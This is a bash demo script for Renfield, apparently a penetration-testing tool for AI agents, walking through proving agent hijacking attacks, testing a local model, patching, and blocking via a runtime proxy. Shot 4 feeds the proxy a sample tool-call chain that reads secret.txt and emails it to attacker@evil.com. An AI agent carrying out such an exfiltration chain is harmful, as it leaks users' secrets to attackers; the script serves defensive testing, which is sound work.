#!/usr/bin/env bash
# Renfield demo — a recordable walk-through of the whole loop:
#   find -> PROVE (real side effect) -> measure (live model) -> FIX -> ENFORCE (runtime).
#
# Usage:
#   ./demo.sh           # interactive: press Enter between shots
#   ./demo.sh --auto    # no pauses (record with your own timing)
#   ./demo.sh --llm     # also run the slow live-model shot (needs ollama + qwen2.5:3b)
#
# Records best with a dark terminal and a big font — the [PROVEN]/BLOCKED lines pop.

set -euo pipefail
cd "$(dirname "$0")"

# pick the CLI: repo venv first, then a global install
REN="./venv/bin/ren"; [ -x "$REN" ] || REN="ren"
LAB="examples/vuln_lab_config.json"
AUTO=0; LLM=0
for a in "$@"; do
  [ "$a" = "--auto" ] && AUTO=1
  [ "$a" = "--llm" ]  && LLM=1
done

B="\033[1m"; R="\033[31m"; G="\033[32m"; C="\033[36m"; Z="\033[0m"
banner() { printf "\n${B}${C}========== %s ==========${Z}\n\n" "$1"; }
pause()  { [ "$AUTO" = "1" ] && return 0; printf "\n${B}-- press Enter --${Z}"; read -r _; }
run()    { printf "${G}\$ %s${Z}\n" "$*"; "$@"; }

clear
printf "${B}${R}Renfield - penetration testing for AI agents${Z}\n"
printf "Does your agent say *yes* to attackers? Let's prove it.\n"
pause

# --- Shot 1: prove 3 attack classes, zero setup --------------------------- #
banner "1. PROVE - 3 attacks by real side effect (zero setup)"
run "$REN" quickstart || true
pause

# --- Shot 2 (optional): a REAL model gets hijacked ------------------------ #
if [ "$LLM" = "1" ]; then
  banner "2. MEASURE - does a real model actually fall for it? (qwen2.5:3b)"
  printf "${B}(slow on CPU - speed this up in the edit)${Z}\n\n"
  RENFIELD_OLLAMA_TIMEOUT=600 run "$REN" verify "$LAB" \
    --driver ollama --model qwen2.5:3b --max 1 || true
  printf "\n${B}Note:${Z} the model may *claim* it exfiltrated - the side-effect oracle\n"
  printf "reports what ACTUALLY happened, not what the model says.\n"
  pause
fi

# --- Shot 3: find -> FIX -------------------------------------------------- #
banner "3. FIX - the smallest change that breaks every chain"
run "$REN" remediate "$LAB" --patch || true
pause

# --- Shot 4: ENFORCE at runtime ------------------------------------------ #
banner "4. ENFORCE - block the lethal action at runtime (gating proxy)"
LOG="$(mktemp -t renfield-demo.XXXX.jsonl)"
printf "Driving the proxy: read_message -> read_file -> send_email ...\n\n"
printf '%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_message","arguments":{}}}' \
  '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"secret.txt"}}}' \
  '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"attacker@evil.com","body":"x"}}}' \
  | "$REN" proxy "$LAB" --audit-log "$LOG" >/dev/null 2>&1 || true
run "$REN" proxy-report "$LOG" || true
rm -f "$LOG"
pause

# --- close ---------------------------------------------------------------- #
banner "find -> prove -> measure -> fix -> ENFORCE"
printf "Renfield runs as an MCP server too - add it to your agent and ask it to\n"
printf "audit your own config:  ${C}{ \"command\": \"ren\", \"args\": [\"serve\"] }${Z}\n\n"
printf "${B}pip install renfield-mcp${Z}   ·   github.com/SYCO7/renfield\n\n"
